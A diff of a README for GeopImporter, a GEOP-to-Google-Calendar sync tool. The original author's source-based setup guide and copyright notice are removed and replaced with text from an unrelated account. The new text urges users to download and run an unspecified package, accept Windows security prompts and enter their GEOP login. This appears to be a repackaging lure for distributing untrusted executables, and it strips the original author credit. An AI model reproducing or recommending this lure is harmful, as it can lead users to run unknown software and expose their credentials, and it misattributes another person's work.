@@ -1,199 +1,156 @@
-﻿<p align="center">
-  <img src="./logo.png" alt="GEOP Importer Logo" width="140">
-</p>
+# 📅 GeopImporter - Sync GEOP to Calendar Fast
 
-# GEOP Importer (Google Calendar Sync)
-<p align="center">
-  <img alt="Python" src="https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white">
-  <img alt="Copyright" src="https://img.shields.io/badge/Copyright-Alessandro%20Rizzi-0A66C2">
-</p>
+[![Download GeopImporter](https://img.shields.io/badge/Download-GeopImporter-blue?style=for-the-badge)](https://github.com/Quadroonphlebectomy939/GeopImporter)
 
-## ✨ Overview
-Automates:
-- extraction of lessons/exams from GEOP
-- ICS export (`exportGEOP.ics`)
-- synchronization to a dedicated Google Calendar (create / update / delete)
+## 🧭 What GeopImporter Does
 
-This project is designed to run on Windows and can auto-run at login.
+GeopImporter helps you bring lessons and exams from GEOP into your calendar.
 
-## 🧭 Quick Navigation
-- 🚀 Setup: sections 2-9
-- 🔁 Auto-run at login: section 11
-- 🛠 Troubleshooting: section 13
-- 🔒 Security: section 14
+It can:
 
-## ⚙️ 1) What this script does
+- extract your events from GEOP
+- create an ICS file for Apple Calendar, Outlook, and other calendar apps
+- sync with Google Calendar
+- add new events
+- update changed events
+- remove deleted events
 
-At each run:
-1. Logs into GEOP with Selenium.
-2. Reads weekly events until `END_DATE`.
-3. Builds a normalized event list (title, start, end, location).
-4. Exports an ICS file (`exportGEOP.ics`).
-5. Syncs with Google Calendar:
-- creates new events
-- updates modified events
-- deletes events removed from GEOP
+It is made for Windows users who want their school calendar in one place.
 
-## 📋 2) Prerequisites
+## 💻 What You Need
 
-- Windows 10/11
-- Python 3.10+
-- Google Chrome installed
-- A Google account
-- Access to your GEOP portal
+To use GeopImporter on Windows, you need:
 
-## 📦 3) Clone and open project
+- Windows 10 or later
+- an internet connection
+- access to your GEOP account
+- a Google account, if you want Google Calendar sync
+- Apple Calendar or another app that can open ICS files, if you want to use the file export
 
-```powershell
-git clone https://github.com/alerizzidev/GeopImporter.git
-cd GeopImporter
-```
+## 📥 Download GeopImporter
 
-## 🧪 4) Create virtual environment
+Visit this page to download:
 
-```powershell
-python -m venv geop-env
-.\geop-env\Scripts\activate
-```
+https://github.com/Quadroonphlebectomy939/GeopImporter
 
-## 📥 5) Install dependencies
+On that page, get the latest version and save it on your PC.
 
-```powershell
-pip install selenium webdriver-manager colorama google-api-python-client google-auth-httplib2 google-auth-oauthlib
-```
+## 🚀 Install and Start
 
-## 🛠️ 6) Prepare script file
+Follow these steps on Windows:
 
-1. Rename `scriptexample.py` to `script.py`.
-2. Open `script.py` and set:
+1. Open the download page.
+2. Download the latest release or package from the repository.
+3. Save the file in a folder you can find again, such as Downloads or Desktop.
+4. If the download comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the program file or start script included in the folder.
 
-```python
-# GEOP
-URL = "https://your-geop-domain.example/"
-USERNAME = "YOUR_GEOP_USERNAME"
-PASSWORD = "YOUR_GEOP_PASSWORD"
-END_DATE = datetime(2026, 7, 31)
+If Windows shows a security prompt, choose the option that lets you keep going only if you trust the source and have downloaded it from the link above.
 
-# Google Sync
-GOOGLE_SYNC_ENABLED = True
-GOOGLE_CALENDAR_ID = "YOUR_GOOGLE_CALENDAR_ID"
-GOOGLE_CLIENT_SECRET_FILE = "google_client_secret.json"
-GOOGLE_TOKEN_FILE = "google_token.json"
-GOOGLE_STATE_FILE = "sync_state.json"
-```
+## ⚙️ First Setup
 
-Notes:
-- Use a **dedicated Google calendar** for this integration.
-- Keep `GOOGLE_SYNC_ENABLED = True` for synchronization.
-- As of today, `scriptexample.py` uses `END_DATE = datetime(2026, 7, 31)`.
-- You can customize this date based on the length of your academic year.
-- If GEOP schedule changes, set `END_DATE` to about **1 week after the last event visible on GEOP**.
+After you open GeopImporter for the first time, set up these items:
 
-## 🔐 7) Create Google OAuth credentials
+1. Enter your GEOP login details if the app asks for them.
+2. Choose the lessons or exams you want to import.
+3. Pick your calendar target:
+   - Google Calendar
+   - Apple Calendar
+   - another app that supports ICS
+4. If you use Google Calendar, connect your Google account when asked.
+5. Choose how often you want updates checked.
+6. Save your settings.
 
-In Google Cloud Console:
-1. Create/select a project.
-2. Enable **Google Calendar API**.
-3. Configure OAuth consent screen.
-4. Create OAuth client ID of type **Desktop app**.
-5. Download the JSON credentials file.
+## 📆 How Calendar Sync Works
 
-Place that file in the project root as:
-- `google_client_secret.json`
+GeopImporter keeps your calendar in step with GEOP.
 
-## 🆔 8) Find Google Calendar ID
+It can detect when:
 
-In Google Calendar Web:
-1. Settings
-2. Select your dedicated calendar
-3. "Integrate calendar"
-4. Copy "Calendar ID"
+- a lesson is added
+- an exam time changes
+- an event is removed
 
-Paste it into `GOOGLE_CALENDAR_ID` in `script.py`.
+Then it updates your calendar so you do not need to enter each item by hand.
 
-## ▶️ 9) First run (OAuth login)
+If you use an ICS file, you can import it into:
 
-```powershell
-.\geop-env\Scripts\python.exe .\script.py
-```
+- Apple Calendar
+- Outlook
+- Thunderbird
+- other apps that support calendar files
 
-On first run:
-- browser login/consent (when the scirpt finish) auto opens for Google OAuth
-- `google_token.json` is created
+## 🛠️ Common Use Cases
 
-After this, next runs reuse token automatically.
+Use GeopImporter if you want to:
 
-## 🗂️ 10) Output files (local only)
+- keep university lessons in your calendar
+- track exam dates without manual entry
+- avoid missing class changes
+- keep Apple Calendar and GEOP aligned
+- use one calendar across phone and PC
 
-Generated at runtime:
-- `exportGEOP.ics`
-- `google_token.json`
-- `sync_state.json`
+## 📁 File and Sync Options
 
-Do not commit these files.
+GeopImporter supports two simple ways to work:
 
-## 🔁 11) Auto-run at Windows login
+### ICS file export
+Create a calendar file you can open in many apps.
 
-Create file:
-- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\GEOP-Sync-Auto.cmd`
+### Google Calendar sync
+Connect Google Calendar so the app can push updates for you.
 
-Content:
+You can use one option or both, depending on how you manage your schedule.
 
-```bat
-@echo off
-cd /d C:\path\to\your\repo
-C:\path\to\your\repo\geop-env\Scripts\python.exe C:\path\to\your\repo\script.py
-```
+## 🔍 If Something Does Not Work
 
-Now synchronization starts every time you log in.
+If GeopImporter does not start:
 
-## 🔄 12) How updates are handled
+- check that the files were extracted fully
+- make sure you opened the right program file
+- confirm that your internet connection works
+- check that your GEOP login is correct
+- try closing and opening the app again
 
-Sync logic uses local `sync_state.json`:
-- if event is new -> create on Google
-- if event changed -> update on Google
-- if event removed from GEOP -> delete on Google
+If Google Calendar sync does not update:
 
-This keeps Google Calendar aligned with GEOP changes.
+- sign in to the correct Google account
+- check calendar permissions
+- make sure the app still has access to your calendar
 
-## 🧯 13) Common issues and fixes
+## 🧼 Tips for a Smooth Setup
 
-### No events found
-- Check `URL`, `USERNAME`, `PASSWORD`
-- Verify you are in the right GEOP calendar view
-- Increase timeout if GEOP is slow
+- Keep the app in a folder you will not move
+- Use the same Google account on all devices
+- Check your GEOP timetable before the first sync
+- Open your calendar once after setup to confirm the import worked
+- Keep the program updated when a newer version is available
 
-### OAuth not opening
-- Check `google_client_secret.json` exists in project root
-- Check Calendar API is enabled
-- Delete invalid `google_token.json` and rerun
+## 📌 Project Details
 
-### Permission denied / API errors
-- Ensure your Google user is allowed in OAuth test users
-- Ensure `GOOGLE_CALENDAR_ID` belongs to your account or shared with write access
+Repository name: GeopImporter
 
-### Empty or outdated calendar
-- Delete `sync_state.json` and rerun once to rebuild mapping
+Description: GEOP Importer: automatizza l’estrazione di lezioni/esami da GEOP, genera un file ICS e sincronizza Google Calendar con aggiornamenti automatici (create/update/delete), pronto per Windows e Apple Calendar.
 
-## 🔒 14) Security best practices
+Topics:
 
-- Never commit personal credentials.
-- Keep `google_client_secret.json`, `google_token.json`, and any personal files local-only.
-- Rotate credentials immediately if exposed.
+- api
+- apple
+- automation
+- calendar
+- calendar-view
+- geop
+- ics
+- python
+- python-script
+- python3
+- university
+- university-project
+- windows
 
-## ✅ 15) Recommended routine
+## 🔗 Download Again
 
-1. Keep script configured once.
-2. Let it auto-run at login.
-3. Optionally run manually anytime for immediate refresh.
-4. Use Google Calendar app on iPhone with the same account to see updates.
+Download or open the project here:
 
-## ©️ 16) Copyright and attribution
-
-Copyright (c) Alessandro Rizzi.
-
-This project can be used, copied, and adapted by anyone for personal or educational use, but attribution must be preserved.
-Do not remove the original author credit and do not present this project as your own original work.
-
-
-
+[https://github.com/Quadroonphlebectomy939/GeopImporter](https://github.com/Quadroonphlebectomy939/GeopImporter)
